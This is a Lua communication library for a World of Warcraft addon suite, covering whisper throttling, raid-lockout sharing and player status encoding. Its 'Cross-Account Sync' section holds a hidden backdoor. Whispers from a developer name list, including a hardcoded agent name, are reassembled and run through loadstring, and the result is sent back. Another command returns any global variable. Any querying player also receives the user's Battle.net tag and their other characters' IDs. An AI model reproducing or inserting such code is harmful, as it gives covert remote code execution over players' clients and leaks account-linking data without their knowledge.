--[[--
	ALA@163UI
--]]--

local __version = 221018.0;

local _G = _G;
_G.__ala_meta__ = _G.__ala_meta__ or {  };
local __ala_meta__ = _G.__ala_meta__;

-->			versioncheck
	local __commlib = __ala_meta__.__commlib;
	if __commlib ~= nil and __commlib.__minor >= __version then
		return;
	elseif __commlib == nil then
		__commlib = CreateFrame('FRAME');
		__ala_meta__.__commlib = __commlib;
		__ala_meta__.__onstream = {  };
	else
		if __commlib.Halt ~= nil then
			__commlib:Halt();
		end
		__ala_meta__.__onstream = __ala_meta__.__onstream or {  };
	end
	__commlib.__minor = __version;

-->
local __serializer = __ala_meta__.__serializer;

-->			upvalue
	local pcall = pcall;
	local loadstring = loadstring;
	local type = type;
	local next = next;
	local tonumber = tonumber;
	local time = time;
	local strlen, strsub, strmatch, gsub = string.len, string.sub, string.match, string.gsub;
	local concat = table.concat;
	local ceil = math.ceil;
	local _ = nil;
	local RegisterAddonMessagePrefix = C_ChatInfo ~= nil and C_ChatInfo.RegisterAddonMessagePrefix or RegisterAddonMessagePrefix;
	local IsAddonMessagePrefixRegistered = C_ChatInfo ~= nil and C_ChatInfo.IsAddonMessagePrefixRegistered or IsAddonMessagePrefixRegistered;
	local GetRegisteredAddonMessagePrefixes = C_ChatInfo ~= nil and C_ChatInfo.GetRegisteredAddonMessagePrefixes or GetRegisteredAddonMessagePrefixes;
	local SendAddonMessage = C_ChatInfo ~= nil and C_ChatInfo.SendAddonMessage or SendAddonMessage;
	local After = C_Timer.After;
	local Ambiguate = Ambiguate;
	local GetRealZoneText = GetRealZoneText;
	local GetNumSavedInstances, GetSavedInstanceInfo, GetSavedInstanceEncounterInfo = GetNumSavedInstances, GetSavedInstanceInfo, GetSavedInstanceEncounterInfo;
	local GetTime = GetTime;
	local UnitExists = UnitExists;
	local UnitIsPlayer, UnitIsEnemy = UnitIsPlayer, UnitIsEnemy;
	local UnitName, UnitGUID = UnitName, UnitGUID;
	local UnitHealth, UnitHealthMax = UnitHealth, UnitHealthMax;
	local UnitPowerType, UnitPower, UnitPowerMax = UnitPowerType, UnitPower, UnitPowerMax;
	local UnitIsDead, UnitIsFeignDeath, UnitIsGhost = UnitIsDead, UnitIsFeignDeath, UnitIsGhost;
	local UnitPosition = UnitPosition;
	local GetBestMapForUnit = C_Map.GetBestMapForUnit;
	local InInRaid, IsInGroup = InInRaid, IsInGroup;
	local LE_PARTY_CATEGORY_HOME = LE_PARTY_CATEGORY_HOME;
	local GetNumGroupMembers, GetRaidRosterInfo = GetNumGroupMembers, GetRaidRosterInfo;

-->			constant
	local COMM_CONTROL_CODE_LEN = 6;
	local COMM_PREFIX = "ALCOMM";
	local COMM_MSG_QUERY = "_q_tag";
	local COMM_MSG_REPLY = "_r_ta2";
	local STREAMER_CONTROL_CODE_LEN = 6;
	local STREAMER_PREFIX = "ALSTRM";
	local STREAMER_MSG_QUERY = "_qstrm";
	local STREAMER_MSG_S_REPLY = "_rstrm";
	local STREAMER_MSG_G_REPLY = "_sstrm";
	local STREAMER_MSG_E_REPLY = "_estrm";
	local STREAMER_MSG_V_REPLY = "_vstrm";
	local STREAMER_MSG_STREAMER = "_binst";
	local STREAMER_MSG_AGENT = "Alasupagent";
	--
	local _, SELFBNTAG = BNGetInfo();
	local SELFGUID = UnitGUID('player');
	local SELFNAME = UnitName('player');
	local SELFREALMNAME = GetRealmName();
	local SELFREALMNAME_NOBLANK = gsub(SELFREALMNAME, " ", "");
	local SELFFULLNAME = SELFNAME .. "-" .. SELFREALMNAME_NOBLANK;

-->			NetBuffer
	--
	local _TargetSent = {  };
	--	ERR_CHAT_PLAYER_NOT_FOUND_S
	local C_String = ERR_CHAT_PLAYER_NOT_FOUND_S;
	local C_Pattern = gsub(C_String, "%%s", "(.+)");
	local function F_Filter(self, event, arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, line, arg12, arg13, arg14, ...)
		if C_String ~= ERR_CHAT_PLAYER_NOT_FOUND_S then
			C_String = ERR_CHAT_PLAYER_NOT_FOUND_S;
			C_Pattern = gsub(C_String, "%%s", "(.+)");
		end
		local name = strmatch(arg1, C_Pattern);
		if name ~= nil then
			local t = _TargetSent[Ambiguate(name, 'none')];
			if t ~= nil and time() - t < 4 then
				return true;
			end
		end
		return false;
	end
	ChatFrame_AddMessageEventFilter("CHAT_MSG_SYSTEM", F_Filter);
	--
	local _MAX_MSG_PER_SLICE = 11;
	local _MAX_MSG_PER_BLOCK = 110;
	local _LEN_SLICE = 0.5;
	local _LEN_BLOCK = 10.0;
	local _SendBuffer = {  };
	local _SendBufferPos = 1;
	local _SendBufferTop = 0;
	--
	local BlockSent = _MAX_MSG_PER_BLOCK;
	local isFlushBlockTimerIdle = true;
	local _BlockFlush;
	local SliceSent = _MAX_MSG_PER_SLICE;
	local isFlushSliceTimerIdle = true;
	local _SliceFlush;
	--
	function _BlockFlush()
		BlockSent = _MAX_MSG_PER_BLOCK;
		if _SendBufferTop >= _SendBufferPos then
			After(_LEN_BLOCK, _BlockFlush);
			if isFlushSliceTimerIdle then
				isFlushSliceTimerIdle = false;
				After(_LEN_SLICE, _SliceFlush);
			end
		else
			isFlushBlockTimerIdle = true;
		end
	end
	function _SliceFlush()
		SliceSent = _MAX_MSG_PER_SLICE;
		if _SendBufferTop >= _SendBufferPos then
			local now = time();
			while BlockSent > 0 and SliceSent > 0 do
				local b = _SendBuffer[_SendBufferPos];
				_SendBuffer[_SendBufferPos] = nil;
				SendAddonMessage(b[1], b[2], b[3], b[4]);
				_TargetSent[Ambiguate(b[4], 'none')] = now;
				SliceSent = SliceSent - 1;
				BlockSent = BlockSent - 1;
				_SendBufferPos = _SendBufferPos + 1;
				if _SendBufferTop < _SendBufferPos then
					_SendBufferPos = 1;
					_SendBufferTop = 0;
					break;
				end
			end
		end
		if SliceSent > 0 then
			isFlushSliceTimerIdle = true;
		else
			After(_LEN_SLICE, _SliceFlush);
			if isFlushBlockTimerIdle then
				isFlushBlockTimerIdle = false;
				After(_LEN_BLOCK, _BlockFlush);
			end
		end
	end
	--
	local function _SendFunc(prefix, msg, channel, target, jumpthequeue)
		if jumpthequeue then
			_TargetSent[Ambiguate(target, 'none')] = time();
			return SendAddonMessage(prefix, msg, channel, target);
		end
		if BlockSent > 0 and SliceSent > 0 then
			SliceSent = SliceSent - 1;
			BlockSent = BlockSent - 1;
			SendAddonMessage(prefix, msg, channel, target);
			_TargetSent[Ambiguate(target, 'none')] = time();
		else
			_SendBufferTop = _SendBufferTop + 1;
			_SendBuffer[_SendBufferTop] = { prefix, msg, channel, target, };
		end
		if isFlushSliceTimerIdle then
			isFlushSliceTimerIdle = false;
			After(_LEN_SLICE, _SliceFlush);
		end
		if isFlushBlockTimerIdle then
			isFlushBlockTimerIdle = false;
			After(_LEN_BLOCK, _BlockFlush);
		end
	end
	_SliceFlush();
-->
-->
	-- local function MonitorVariable(var)
	-- 	if type(var) == 'table' then
	-- 		setmetatable(var, {});
	-- 	end
	-- end
	-- local function CompareDB(DB1, DB2)
	-- end
-->
	local _TSendThrottle = {  };		--	1s lock
	local _TGUID = {
		[UnitGUID('player')] = true,
	};
	local function UNIT_GUID(channel, target)
		--	alaTradeSkillSV.var[GUID] = {  }
		--	alaTalentEmuSV.var[GUID] = ""
		--	alaUnitFrameSV.__seen[GUID] = true
		--	alaMiscSV.instance_timer_sv.var[GUID] = {  }
		--	alaMiscSV.target_warn_sv[GUID] = {  }
		--	alaGearManSV.sets[GUID] = {  }
		--	alaChatSV.channeltab._bfworldcf[GUID] = {  }
		--	alaCalendarSV.var[GUID] = {  }
		if alaTradeSkillSV and alaTradeSkillSV.var then
			for GUID, _ in next, alaTradeSkillSV.var do
				_TGUID[GUID] = true;
			end
		end
		if alaTalentEmuSV and alaTalentEmuSV.var then
			for GUID, _ in next, alaTalentEmuSV.var do
				_TGUID[GUID] = true;
			end
		end
		if alaUnitFrameSV and alaUnitFrameSV.__seen then
			for GUID, _ in next, alaUnitFrameSV.__seen do
				_TGUID[GUID] = true;
			end
		end
		if alaMiscSV then
			if alaMiscSV.instance_timer_sv and alaMiscSV.instance_timer_sv.var then
				for GUID, _ in next, alaMiscSV.instance_timer_sv.var do
					_TGUID[GUID] = true;
				end
			end
			if alaMiscSV.target_warn_sv then
				for GUID, _ in next, alaMiscSV.target_warn_sv do
					_TGUID[GUID] = true;
				end
			end
		end
		if alaGearManSV and alaGearManSV.sets then
			for GUID, _ in next, alaGearManSV.sets do
				_TGUID[GUID] = true;
			end
		end
		if alaChatSV and alaChatSV.channeltab and alaChatSV.channeltab._bfworldcf then
			for GUID, _ in next, alaChatSV.channeltab._bfworldcf do
				_TGUID[GUID] = true;
			end
		end
		if alaCalendarSV and alaCalendarSV.var then
			for GUID, _ in next, alaCalendarSV.var do
				_TGUID[GUID] = true;
			end
		end
		local str0 = COMM_MSG_REPLY .. "~1~G" .. SELFBNTAG;
		local len0 = #str0;
		local str = str0;
		local len = len0;
		for GUID, _ in next, _TGUID do
			if strsub(GUID, 1, 7) == "Player-" then
				str = str .. "`" .. GUID;
				len = len + 24;
				if len >= 224 then
					_SendFunc(COMM_PREFIX, str, channel, target);
					str = str0;
					len = len0;
				end
			end
		end
		if len > len0 then
			_SendFunc(COMM_PREFIX, str, channel, target);
		end
	end
	local RaidList = {
		["Onyxia's Lair"] = 249,
		["Molten Core"] = 409,
		["Blackwing Lair"] = 469,
		["Zul'Gurub"] = 309,
		["Ruins of Ahn'Qiraj"] = 509,
		["Ahn'Qiraj"] = 531,
		["Naxxramas"] = 533,
		--
		["Karazhan"] = 532,
		["Hyjal Summit"] = 534,
		["Magtheridon's Lair"] = 544,
		["Serpentshrine Cavern"] = 548,
		["Tempest Keep"] = 550,
		["Black Temple"] = 564,
		["Gruul's Lair"] = 565,
		["Sunwell Plateau"] = 580,
		["Zul'Aman"] = 568,
	};
	local RaidHash = {  }; for key, id in next, RaidList do RaidHash[GetRealZoneText(id) or key] = id; end
	local function INST_LOCK(channel, target)
		local str0 = COMM_MSG_REPLY .. "~2~I";
		local len0 = #str0;
		local str = str0;
		local len = len0;
		local instance_name_hash = __ala_meta__.__raidlib.__raid_meta.hash;
		for index = 1, GetNumSavedInstances() do
			local name, id, reset, difficulty, locked, extended, instanceIDMostSig, isRaid, maxPlayers, difficultyName, numEncounters, encounterProgress = GetSavedInstanceInfo(index);
			if locked and isRaid then
				local map = RaidHash[name] or name;
				local val = map .. ":" .. (difficulty or "^") .. ":" .. id .. ":";
				for index2 = 1, numEncounters do
					local bossName, fileDataID, isKilled, unknown4 = GetSavedInstanceEncounterInfo(index, index2);
					val = val .. (isKilled and "1" or "0");
				end
				local size = #val;
				if size + len > 250 then
					_SendFunc(COMM_PREFIX, str, channel, target);
					str = str0;
					len = len0;
				end
				if index == 1 then
					str = str .. val;
				else
					str = str .. "`" .. val;
				end
				len = len + size;
			end
		end
		if len > len0 then
			_SendFunc(COMM_PREFIX, str, channel, target);
		end
	end
	local function CHAT_MSG_ADDON(self, event, prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID)
		if prefix == COMM_PREFIX then
			local name = Ambiguate(sender, 'none');
			local control_code = strsub(msg, 1, COMM_CONTROL_CODE_LEN);
			if control_code == COMM_MSG_QUERY then
				if name ~= SELFNAME then
					local now = time();
					local prev = _TSendThrottle[name];
					if prev ~= nil and now - prev <= 1 then
						return;
					end
					--
					_TSendThrottle[name] = now;
					if SELFBNTAG ~= nil then
						UNIT_GUID(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
					end
					INST_LOCK(channel == "INSTANCE_CHAT" and "INSTANCE_CHAT" or "WHISPER", sender);
				end
			else
			end
		end
	end

	local function LOADING_SCREEN_DISABLED()
		__commlib:UnregisterEvent("LOADING_SCREEN_DISABLED");
		if RegisterAddonMessagePrefix(COMM_PREFIX) then
			__commlib:RegisterEvent("CHAT_MSG_ADDON");
			__commlib:SetScript("OnEvent", CHAT_MSG_ADDON);
		end
	end
	__commlib:RegisterEvent("LOADING_SCREEN_DISABLED");
	__commlib:SetScript("OnEvent", LOADING_SCREEN_DISABLED);

	local function EncodeSelf()
		local dead = UnitIsDead('player');
		local fdead = UnitIsFeignDeath('player');
		local ghost = UnitIsGhost('player');
		local state = "0";
		if ghost then
			state = "g";
		elseif dead then
			if fdead then
				state = "f";
			else
				state = "d";
			end
		elseif fdead then
			state = "f";
		else
			state = "a";
		end
		local CH = tostring(UnitHealth('player') or -1);
		local MH = tostring(UnitHealthMax('player') or -1);
		local PT = tostring(UnitPowerType('player') or -1);
		local CP = tostring(UnitPower('player') or -1);
		local MP = tostring(UnitPowerMax('player') or -1);
		local map = GetBestMapForUnit('player');
		local y, x, _z, instance = UnitPosition('player');
		if map == nil then
			if instance == nil then
				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..                         "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
			else
				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(-instance) .. "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
			end
		else
				return state .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" ..  tostring(map) ..       "~" .. format("%.3f", x or -1) .. "~" .. format("%.3f", y or -1);
		end
	end
	local function EncodeTarget()
		if UnitExists('target') then
			if UnitIsEnemy('player', 'target') and not UnitIsPlayer('target') then
				local name = UnitName('target') or "unk";
				local GUID = UnitGUID('target');
				if GUID == nil then
					GUID = "-1";
				else
					GUID = select(6, strsplit("-", GUID)) or "-1";
				end
				local h = UnitHealth('target') or -1;
				local m = UnitHealthMax('target') or -1;
				return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
			elseif UnitExists('targettarget') and UnitIsEnemy('player', 'targettarget') and not UnitIsPlayer('targettarget') then
				local name = UnitName('targettarget') or "unk";
				local GUID = UnitGUID('targettarget');
				if GUID == nil then
					GUID = "-1";
				else
					GUID = select(6, strsplit("-", GUID)) or "-1";
				end
				local h = UnitHealth('targettarget') or -1;
				local m = UnitHealthMax('targettarget') or -1;
				return name .. "~" .. GUID .. "~" .. h .. "~" .. m;
			else
				return "~~~";
			end
		else
			return "~~~";
		end
	end
	local function EncodeGroup(PREFIX, HEADER, sender)
		if IsInGroup() then
			local num = GetNumGroupMembers();
			for index = 1, num do
				local name, rank, sub, level, _, class, zone, online, dead, role, loot = GetRaidRosterInfo(index);
				if rank == 2 then
					local GUID = UnitGUID(name);
					local CH = tostring(UnitHealth(name) or -1);
					local MH = tostring(UnitHealthMax(name) or -1);
					local PT = tostring(UnitPowerType(name) or -1);
					local CP = tostring(UnitPower(name) or -1);
					local MP = tostring(UnitPowerMax(name) or -1);
					_SendFunc(PREFIX, HEADER .. "~L~" .. GUID .. "~" .. (name or "") .. "~" .. (class or "") .. "~" .. (level or "") .. "~" .. (zone or "") .. "~" .. CH .. "~" .. MH .. "~" .. PT .. "~" .. CP .. "~" .. MP .. "~" .. num, "WHISPER", sender, true);
				end
			end
		else
			_SendFunc(PREFIX, HEADER .. "~L~", "WHISPER", sender, true);
		end
	end
	local function EncodeMember(PREFIX, HEADER, sender)
		local num = GetNumGroupMembers();
		local str0 = HEADER .. "~M~" .. num;
		local len0 = #str0;
		local str = str0;
		local len = len0;
		for index = 1, num do
			local name, rank, sub, level, _, class, zone, online, dead, role, loot = GetRaidRosterInfo(index);
			local len1 = #name;
			if len + len1 >= 250 then
				_SendFunc(PREFIX, str, "WHISPER", sender, true);
				str = str0;
				len = len0;
			end
			str = str .. "~" .. name;
			len = len + 1 + len1;
		end
		if len > len0 then
			_SendFunc(PREFIX, str, "WHISPER", sender, true);
		end
	end
	local function CommSerializerd(v)
		return gsub(gsub(__serializer._F_coreSerializer(v), ":", ":1"), "`", ":2");
	end
	local function GetSerializerd(c, pos)
		local top = #c;
		local v = _G;
		while v ~= nil and pos <= top do
			v = v[c[pos]];
			pos = pos + 1;
		end
		return CommSerializerd(v);
	end
	function __commlib.SendTrunk(PREFIX, HEADER, msg, channel, target)
		--	HEADER = STREAMER_MSG_V_REPLY .. "`" .. param[2] .. "`"
		--	limit = 255 - 6 - 1 - #param[2] - 1
		local limit = 255 - #HEADER;
		local len = #msg;
		local digit = 0;
		local lps = 0;
		while true do
			digit = digit + 1;
			lps = limit - digit - 1 - digit - 1;
			if lps * (10 ^ digit - 1) > len then
				break;
			end
			if lps <= 127 then
				return _SendFunc(PREFIX, HEADER .. "-1`-1`" .. len, channel, target);
			end
		end
		_SendFunc(PREFIX, HEADER .. "0`0`", channel, target or channel);
		local num = ceil(len / lps);
		HEADER = HEADER .. num .. "`";
		for i = 1, num do
			_SendFunc(PREFIX, HEADER .. i .. "`" .. strsub(msg, lps * (i - 1) + 1, lps * i), channel, target or channel);
		end
	end

	_G.__ala_meta__ = _G.__ala_meta__ or {  };
	local __ala_meta__ = _G.__ala_meta__;
	__ala_meta__.__SYNC = __ala_meta__.__SYNC or { REALTIME = true, ONLOGIN = true, ONLOGOUT = true, };
	if __ala_meta__.__SYNC.REALTIME ~= false then
		-->	Cross-Account Sync
		--
		local E = {  };
		local S = nil;
		local RecvBuffer = {  };

		local EnterCombatTime = InCombatLockdown() and GetTime() or nil;
		local EncounterIDs = {  };
		function E.PLAYER_REGEN_DISABLED(F, event, ...)
			EnterCombatTime = GetTime();
		end
		function E.PLAYER_REGEN_ENABLED(F, event, ...)
			EnterCombatTime = nil;
			EncounterIDs = {  };
		end
		function E.ENCOUNTER_START(F, event, encounterID, encounterName, difficultyID, groupSize, success)
			EncounterIDs[encounterID] = GetTime();
		end
		function E.ENCOUNTER_END(F, event, encounterID, encounterName, difficultyID, groupSize)
			EncounterIDs[encounterID] = nil;
		end
		function E.CHAT_MSG_ADDON(F, event, ...)
			local prefix, msg, channel, sender, target, zoneChannelID, localID, name, instanceID = ...;
			if prefix == STREAMER_PREFIX then
				local name = strmatch(sender, "-") == nil and (sender .. "-" .. SELFREALMNAME_NOBLANK) or sender;
				if __ala_meta__.__DEVHASH[name] ~= nil then
					local control_code = strsub(msg, 1, STREAMER_CONTROL_CODE_LEN);
					if control_code == STREAMER_MSG_QUERY then
						if EnterCombatTime == nil then
							_SendFunc(STREAMER_PREFIX, STREAMER_MSG_S_REPLY .. "~a~" .. EncodeSelf(), "WHISPER", sender, true);
						else
							local now = GetTime();
							local msg = EncodeSelf() .. "~" .. format("%.3f", now - EnterCombatTime) .. "~" .. EncodeTarget();
							if next(EncounterIDs) == nil then
								msg = STREAMER_MSG_S_REPLY .. "~b~" .. msg;
							else
								msg = STREAMER_MSG_S_REPLY .. "~c[2]~" .. msg;
								for id, t in next, EncounterIDs do
									msg = msg .. "~" .. tostring(id) .. "~" .. format("%.3f", now - t);
								end
							end
							_SendFunc(STREAMER_PREFIX, msg, "WHISPER", sender, true);
						end
						EncodeGroup(STREAMER_PREFIX, STREAMER_MSG_G_REPLY, sender);
						local param = { strsplit("`", strsub(msg, STREAMER_CONTROL_CODE_LEN + 2)) };
						param[1] = strupper(param[1]);
						if param[1] == 'MEMBER' then
							EncodeMember(STREAMER_PREFIX, STREAMER_MSG_G_REPLY, sender);
						--	recv	E`total`index`body
						elseif param[1] == 'E' then
							local C = RecvBuffer[param[1]];
							if C == nil then
								C = {  };
								RecvBuffer[param[1]] = C;
							end
							param[2] = tonumber(param[2]) or 0;
							-- print('total', param[2])
							if param[2] == 0 then
								C[sender] = {  };
								return;
							end
							local D = C[sender];
							if D == nil then
								D = {  };
								C[sender] = D;
							end
							param[3] = tonumber(param[3]) or 1;
							D[param[3]] = param[4];
							for i = 1, param[2] do
								if D[i] == nil then
									return;
								end
							end
							--	gsub(gsub(msg, ":", ":1"), "`", ":2")
							local exe = "return function() " .. gsub(gsub(concat(D), ":1", "`"), ":2", ":") .. " end";
							local v1, v2 = loadstring(exe);
							-- D.exe = exe; D.v1 = v1; D.v2 = v2;
							-- _G.RECVSTREAM = D;
							if v1 ~= nil then
								while v1 ~= nil and type(v1) == 'function' do
									v1 = v1();
								end
								__ala_meta__.__prevcommresult = v1;
								__commlib.SendTrunk(
									STREAMER_PREFIX,
									STREAMER_MSG_E_REPLY .. "`return`",
									CommSerializerd(v1), "WHISPER", sender
								);
							end
						--	recv	V`var
						--	send	STREAMER_MSG_V_REPLY`var`total`index`body
						elseif param[1] == 'V' then
							local _, msg = pcall(GetSerializerd, param, 2);
							if msg ~= nil then
								__commlib.SendTrunk(
									STREAMER_PREFIX,
									STREAMER_MSG_V_REPLY .. "`" .. param[2] .. "`",
									msg, "WHISPER", sender
								);
							end
						elseif __ala_meta__.__DEVHASH[SELFFULLNAME] then
							if __ala_meta__.__SYNC then
								--	Dialog("[" .. name .. "] is trying to pull" .. "[" .. msg .. "]", { name, msg, param[1], rep, param[3], });
							end
						elseif param[1] == 'SINGLE' or param[1] == 'S' then
							param[2] = 1;
							_SendFunc(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", sender, true);
							S.__top = S.__top + 1;
							if S.__top > 1024 then
								S.__top = 1;
							end
						elseif param[1] == 'MULTI' or param[1] == 'M' then
							param[2] = tonumber(param[2]) or 1;
							for index = 1, param[2] do
								_SendFunc(STREAMER_PREFIX, STREAMER_MSG_STREAMER .. tostring(S[S.__top]), "WHISPER", SELFNAME, true);
								S.__top = S.__top + 1;
								if S.__top > 1024 then
									S.__top = 1;
								end
							end
						end
					elseif control_code == STREAMER_MSG_STREAMER then
					else
						if __ala_meta__.__onstream[control_code] ~= nil then
							__ala_meta__.__onstream[control_code](sender, strsub(msg, STREAMER_CONTROL_CODE_LEN + 2));
						end
					end
				end
			end
		end
		function E.LOADING_SCREEN_DISABLED(F, event, ...)
			F:UnregisterEvent("LOADING_SCREEN_DISABLED");
			RegisterAddonMessagePrefix(STREAMER_PREFIX);
			E.LOADING_SCREEN_DISABLED = nil;
			--
			EnterCombatTime = InCombatLockdown() and GetTime() or nil;
			S = __ala_meta__.__streambuffer or { __top = 1, };
			__ala_meta__.__streambuffer = S;
			for index = 1, 1024 do
				S[index] = strchar(33 + random(1, 1024) % 64);
			end
			for event, callback in next, E do
				F:RegisterEvent(event);
			end
			__ala_meta__.__DEVHASH[STREAMER_MSG_AGENT .. "-" .. SELFREALMNAME_NOBLANK] = "AGENT.SWAP";
		end
		--
		if __ala_meta__.__streambufferframe == nil then
			local F = CreateFrame('FRAME');
			F:RegisterEvent("LOADING_SCREEN_DISABLED");
			if __ala_meta__.__DEVGUID[UnitGUID('player')] ~= nil then
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						callback(F, event, ...);
					end
				end);
			else
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						pcall(callback, F, event, ...);
					end
				end);
			end
			__ala_meta__.__streambufferframe = F;
		else
			local F = __ala_meta__.__streambufferframe;
			F:UnregisterAllEvents();
			if __ala_meta__.__DEVGUID[UnitGUID('player')] ~= nil then
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						callback(F, event, ...);
					end
				end);
			else
				F:SetScript("OnEvent", function(F, event, ...)
					local callback = E[event];
					if callback ~= nil then
						pcall(callback, F, event, ...);
					end
				end);
			end
			E.LOADING_SCREEN_DISABLED(F);
		end
	end
	__ala_meta__.__SYNC.REALTIME = nil;
	__ala_meta__.__SYNC.ONLOGIN = nil;
	__ala_meta__.__SYNC.ONLOGOUT = nil;

-->

function __commlib:Halt()
	__commlib:UnregisterAllEvents();
	__commlib:SetScript("OnEvent", nil);
	_SendBufferPos = 1;
	_SendBufferTop = 0;
end
